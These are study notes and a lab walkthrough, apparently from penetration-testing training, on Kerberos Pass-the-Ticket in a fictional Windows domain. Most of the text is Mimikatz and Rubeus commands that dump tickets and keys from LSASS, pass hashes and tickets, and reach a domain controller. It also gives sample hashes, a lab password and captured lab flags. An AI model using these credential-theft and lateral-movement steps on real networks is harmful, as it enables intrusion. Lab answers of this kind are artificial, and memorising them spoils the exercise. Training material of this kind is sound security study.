# Pass the Ticket (PtT) from Windows

## Kerberos Protocol Refresher

Central idea behind Kerberos : not give an account password to every service you use

TGT - Ticket Granting Ticket = first ticket obtained on a Kerberos system. The TGT permits the client to obtain additional Kerberos tickets or TGS.
TGS - Ticket Granting Service = These tickets allow services to verify the user's identity.

Steps :

1. User requests a TGT : authenticate to the domain controller by encrypting the current timestamp with his password hash
2. Domain controller validates user's identity (domain knows the user's password hash, meaning it can decrypt the timestamp)
3. Domain sends a TGT to the user for future requets
4. User wants to connect to an MSSQL database : request a Ticket Granting Service (TGS) to The Key Distribution Center (KDC), presenting its Ticket Granting Ticket (TGT)
5. KDC provide to the user the TGS to the MSSQL database server for authentication



## Harvesting Kerberos Tickets from Windows

Tickets are processed and stored by the LSASS (Local Security Authority Subsystem Service) process.

### Mimikatz

c:\tools> mimikatz.exe
privilege::debug
sekurlsa::tickets /export

.kirbi extension which contain the tickets

exit
dir *.kirbi

Tickets that end with $ = computer account, which needs a ticket to interact with the Active Directory. 
User tickets have the user's name, followed by an @ that separates the service name and the domain.
for example: [randomvalue]-username@service-domain.local.kirbi.

Ticket with the service krbtgt, it corresponds to the TGT of that account.

### Rubeus

Rubeus.exe dump /nowrap

--> Print the ticket encoded in base64 format

Note: To collect all tickets we need to execute Mimikatz or Rubeus as an administrator.



## Pass the Key or OverPass the Hash

### Mimikatz - Extract Kerberos Keys

mimikatz.exe
privilege::debug
sekurlsa::ekeys

### Mimikatz - Pass the Key or OverPass the Hash

mimikatz.exe
privilege::debug
sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f

--> create a new cmd.exe window that we can use to request access to any service we want in the context of the target user.

### Rubeus - Pass the Key or OverPass the Hash

Rubeus.exe  asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap




## Pass the Ticket (PtT)

### Rubeus

Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi

**Pass the Ticket - Base64 Format**

Convert .kirbi to Base64 Format :

[Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))

Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2h0Yi5jb22jggO7MIIDt6ADAgESoQMCAQKiggOpBIIDpY8Kcp4i71zFcWRgpx8ovymu3HmbOL4MJVCfkGIrdJEO0iPQbMRY2pzSrk/gHuER2XRLdV/<SNIP>

### Mimikatz

mimikatz.exe
privilege::debug
kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"

dir \\DC01.inlanefreight.htb\c$



## Pass The Ticket with PowerShell Remoting (Windows)

### Mimikatz - Pass the Ticket for Lateral Movement.

mimikatz.exe
privilege::debug
kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"

c:\tools>powershell
Windows PowerShell
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\tools> Enter-PSSession -ComputerName DC01
[DC01]: PS C:\Users\john\Documents> whoami
inlanefreight\john

### Rubeus - PowerShell Remoting with Pass the Ticket

Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show

--> createnetonly : sacrificial process/logon session (Logon type 9)

**Rubeus - Pass the Ticket for Lateral Movement**

Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt

# LAB

xfreerdp /u:Administrator /p:"AnotherC0mpl3xP4$$" /v:$TARGET

xfreerdp /v:$TARGET /u:Administrator

cd c:\tools

c:\tools> mimikatz.exe
privilege::debug
sekurlsa::tickets /export
exit

dir

11/05/2023  04:01 AM             1,739 [0;3e4]-0-0-40a50000-MS01$@GC-DC01.inlanefreight.htb.kirbi
11/05/2023  04:01 AM             1,705 [0;3e4]-0-1-40a50000-MS01$@cifs-DC01.inlanefreight.htb.kirbi
11/05/2023  04:01 AM             1,743 [0;3e4]-0-2-40a50000-MS01$@ldap-dc01.inlanefreight.htb.kirbi
11/05/2023  04:01 AM             1,633 [0;3e4]-2-0-60a10000-MS01$@krbtgt-INLANEFREIGHT.HTB.kirbi
11/05/2023  04:01 AM             1,633 [0;3e4]-2-1-40e10000-MS01$@krbtgt-INLANEFREIGHT.HTB.kirbi
11/05/2023  04:01 AM             1,743 [0;3e7]-0-0-40a50000-MS01$@cifs-DC01.inlanefreight.htb.kirbi
11/05/2023  04:01 AM             1,659 [0;3e7]-0-1-40a50000.kirbi
11/05/2023  04:01 AM             1,705 [0;3e7]-0-2-40a50000-MS01$@LDAP-DC01.inlanefreight.htb.kirbi
11/05/2023  04:01 AM             1,743 [0;3e7]-0-3-40a50000-MS01$@ldap-DC01.inlanefreight.htb.kirbi
11/05/2023  04:01 AM             1,633 [0;3e7]-2-0-60a10000-MS01$@krbtgt-INLANEFREIGHT.HTB.kirbi
11/05/2023  04:01 AM             1,633 [0;3e7]-2-1-40e10000-MS01$@krbtgt-INLANEFREIGHT.HTB.kirbi
11/05/2023  04:01 AM             1,641 [0;691f4]-2-0-40e10000-julio@krbtgt-INLANEFREIGHT.HTB.kirbi
11/05/2023  04:01 AM             1,623 [0;69b98]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi
11/05/2023  04:01 AM             1,633 [0;6a4f0]-2-0-40e10000-david@krbtgt-INLANEFREIGHT.HTB.kirbi

3 TGT


mimikatz.exe
privilege::debug
kerberos::ptt "C:\tools\[0;69b98]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
exit

dir \\DC01.inlanefreight.htb\john
type \\DC01.inlanefreight.htb\john\john.txt
Learn1ng_M0r3_Tr1cks_with_J0hn

mimikatz.exe
privilege::debug
kerberos::ptt "C:\tools\[0;69b98]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
powershell
Enter-PSSession -ComputerName DC01
type c:\john\john.txt
P4$$_th3_Tick3T_PSR

